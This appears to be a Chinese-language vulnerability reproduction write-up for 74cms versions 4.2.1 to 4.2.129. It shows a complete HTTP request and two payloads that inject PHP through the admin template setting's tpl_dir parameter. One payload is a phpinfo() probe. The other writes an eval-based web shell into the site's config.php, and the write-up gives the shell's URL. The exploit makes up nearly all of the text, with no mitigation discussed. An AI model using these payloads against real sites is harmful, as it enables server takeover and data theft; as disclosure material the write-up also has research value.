# 74cms v4.2.1-v4.2.129-后台getshell漏洞

[TOC]

### **0x01漏洞复现**

#### 复现数据包：

```
GET /74cms_v4.2.111/upload/index.php?m=admin&c=tpl&a=set&tpl_dir=','a',phpinfo(),' HTTP/1.1
Host: 192.168.0.126
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.126/74cms_v4.2.111/upload/index.php?m=admin&c=tpl&a=index
Cookie: PHPSESSID=6dhjtn4lsstp4fsmdmgnetv1b1; think_language=zh-CN; think_template=default
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 152.33.3.25

```

```
Payload：?m=admin&c=tpl&a=set&tpl_dir=','a',phpinfo(),'
Payload：?m=admin&c=tpl&a=set&tpl_dir=','a',@eval($_POST['98bk']),'
```

```
存在点：需要路径基础路径：/Application/Home/Conf/config.php  前需要用到网站目录试试403
shell：http://192.168.0.126/74cms_v4.2.111/upload/Application/Home/Conf/config.php
```
